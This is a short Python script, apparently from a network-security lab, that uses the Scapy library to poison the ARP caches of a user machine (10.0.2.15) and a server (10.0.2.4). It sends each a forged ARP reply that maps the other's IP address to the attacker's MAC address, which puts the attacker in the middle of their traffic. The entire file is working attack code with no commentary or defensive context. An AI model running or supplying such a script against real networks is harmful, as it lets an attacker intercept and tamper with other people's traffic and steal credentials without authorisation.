#!/usr/bin/env python
from scapy.all import *

def arp_poisoning():
  # To user (user ip - 10.0.2.15)
  ether1 = Ether()
  ether1.dst = '08:00:27:84:c0:4e'
  arp1 = ARP()
  arp1.op = 2
  arp1.psrc = '10.0.2.4'
  arp1.hwsrc= '08:00:27:2d:90:61'
  pkt1 = ether1/arp1
  sendp(pkt1, count=1)
  
  # To server (server ip - 10.0.2.4)
  ether2 = Ether()
  ether2.dst = '08:00:27:bc:53:6b'
  arp2 = ARP()
  arp2.op = 2
  arp2.psrc = '10.0.2.15'
  arp2.hwsrc = '08:00:27:2d:90:61'
  pkt2 = ether2/arp2
  sendp(pkt2, count=1)
  
  pkt1.show()
  pkt2.show()

if __name__ == '__main__':
  arp_poisoning()
